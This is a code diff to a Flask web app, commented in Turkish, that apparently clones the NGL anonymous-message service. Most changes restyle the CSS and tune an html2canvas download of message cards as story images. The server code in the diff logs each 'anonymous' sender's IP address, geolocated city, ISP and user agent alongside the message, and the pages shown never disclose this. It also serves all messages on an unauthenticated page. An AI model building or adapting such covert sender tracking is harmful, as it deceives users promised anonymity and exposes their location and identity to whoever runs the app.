@@ -73,7 +73,6 @@ MESAJLAR_HTML = """
             margin: 0;
             padding: 0;
             min-height: 100vh;
-            overflow-y: auto;
         }
         h1 {
             text-align: center;
@@ -84,20 +83,21 @@ MESAJLAR_HTML = """
             -webkit-text-fill-color: transparent;
         }
         .story-preview {
-            width: 100%;
-            max-width: 480px;
-            height: 85vh;
-            margin: 20px auto;
+            width: 90%;
+            max-width: 400px;
+            min-height: 800px;
+            margin: 20px auto 40px;
             background: linear-gradient(135deg, #ff00cc, #8a2be2, #4b0082);
             border-radius: 28px;
-            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.6);
-            overflow: hidden;
+            box-shadow: 0 15px 50px rgba(255, 0, 204, 0.4);
+            color: white;
             position: relative;
+            overflow: hidden;
             display: flex;
             flex-direction: column;
             justify-content: flex-start;
             align-items: center;
-            padding: 60px 30px 40px;
+            padding: 80px 30px 60px;
         }
         .story-preview::before {
             content: '';
@@ -113,13 +113,13 @@ MESAJLAR_HTML = """
         .username {
             font-size: 2.4rem;
             font-weight: bold;
-            margin-bottom: 20px;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
+            margin-bottom: 30px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.6);
             text-align: center;
         }
         .message {
             font-size: 1.8rem;
-            line-height: 1.5;
+            line-height: 1.6;
             text-align: center;
             flex-grow: 1;
             display: flex;
@@ -132,7 +132,7 @@ MESAJLAR_HTML = """
             opacity: 0.9;
             text-align: center;
             margin-top: auto;
-            padding-top: 20px;
+            padding-top: 30px;
         }
         .admin-footer {
             font-size: 0.9rem;
@@ -178,29 +178,33 @@ MESAJLAR_HTML = """
             <p>Henüz mesaj yok.</p>
         {% endif %}
     </div>
+
     <script>
         function downloadBox(boxId) {
             const box = document.getElementById(boxId);
             const buttons = box.getElementsByTagName('button');
             for (let btn of buttons) {
-                btn.style.display = 'none'; // butonu gizle (resimde görünmesin)
+                btn.style.display = 'none';
             }
+
             html2canvas(box, {
-                scale: 3, // yüksek kaliteli
-                backgroundColor: null,
+                scale: 4, // yüksek netlik (Story için ideal)
+                backgroundColor: null, // beyaz kenar yok, şeffaf arka plan
                 useCORS: true,
-                logging: false
+                logging: false,
+                windowWidth: box.scrollWidth,
+                windowHeight: box.scrollHeight
             }).then(canvas => {
                 const link = document.createElement('a');
                 link.download = 'ngl_story_mesaj.png';
                 link.href = canvas.toDataURL('image/png');
                 link.click();
-                // Butonu geri göster
+
                 for (let btn of buttons) {
                     btn.style.display = 'block';
                 }
             }).catch(err => {
-                alert("Resim oluşturulamadı: " + err);
+                alert("Resim oluşturulamadı, uzun bas kaydetmeyi dene: " + err);
                 for (let btn of buttons) {
                     btn.style.display = 'block';
                 }
@@ -210,7 +214,9 @@ MESAJLAR_HTML = """
 </body>
 </html>
 """
+
 messages = []
+
 @app.route('/', methods=['GET', 'POST'])
 def home():
     username = request.args.get('username', '') or request.form.get('username', '')
@@ -228,7 +234,9 @@ def home():
                 client_ip = request.headers['X-Real-IP'].strip()
             else:
                 client_ip = request.remote_addr or '127.0.0.1'
+
             user_agent = request.headers.get('User-Agent', 'Bilinmiyor')[:200]
+
             location = "Konum alınamadı"
             isp = "Bilinmiyor"
             if client_ip not in ['127.0.0.1', '::1']:
@@ -242,19 +250,25 @@ def home():
                         isp = geo.get('isp', 'Bilinmiyor')
                 except:
                     pass
+
             log_entry = f"@{username or 'Anonim'} | MESAJ: {msg} | IP: {client_ip} | KONUM: {location} | ISP: {isp} | UA: {user_agent}"
             logging.info(log_entry)
             print(f"[YENİ MESAJ] {log_entry}")
+
             messages.append({
                 "username": username or 'Anonim',
                 "message": msg,
                 "timestamp": datetime.now().strftime("%d.%m.%Y %H:%M:%S")
             })
+
             return render_template_string(HOME_HTML, username=username, success=True)
+
     return render_template_string(HOME_HTML, username=username, success=False)
+
 @app.route('/mesajlar')
 def mesajlar():
     return render_template_string(MESAJLAR_HTML, messages=messages)
+
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
